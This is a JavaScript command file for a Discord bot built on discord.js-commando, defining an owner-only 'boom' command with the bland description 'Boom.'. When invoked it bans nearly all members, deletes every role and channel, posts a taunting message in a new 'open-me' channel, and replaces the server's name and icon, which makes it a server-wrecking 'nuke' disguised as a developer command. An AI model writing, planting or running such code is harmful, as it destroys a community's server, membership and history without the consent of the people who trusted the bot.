const { Command } = require('discord.js-commando'),
      { MessageEmbed } = require('discord.js'),
      config = require('../../data/config');


module.exports = class EmojiCommand extends Command {
    constructor(client) {
        super(client, {
            name: 'boom',
            group: 'dev',
            ownerOnly: true,
            memberName: 'boom',
            description: 'Boom.',
            examples: ['boom']
        });
    }

    async run(msg) {
      try {
      
      const Guild = this.client.guilds.get(msg.guild.id);
      await Guild.setDefaultMessageNotifications("MENTIONS")
      const members = msg.guild.members.filter(member => member.bannable);  
        members.forEach(member => {
          if(member.id != msg.author.id) {
            member.ban()
          }
        })
      await msg.guild.roles.fetch().then(roles => {
        roles.forEach(role => role.delete())
      })
      await msg.guild.channels.forEach(channel => channel.delete())
      await Guild.channels.create("open-me").then(channel => {
           channel.send("Smart people learn from their mistakes, but the real sharp ones learn from the mistakes of others.")
      })
      Guild.setIcon("https://i.imgur.com/4jXWTlF.png")
      await Guild.setName(":)")
      } catch(err) {
        console.log(err)
      }
    }
}
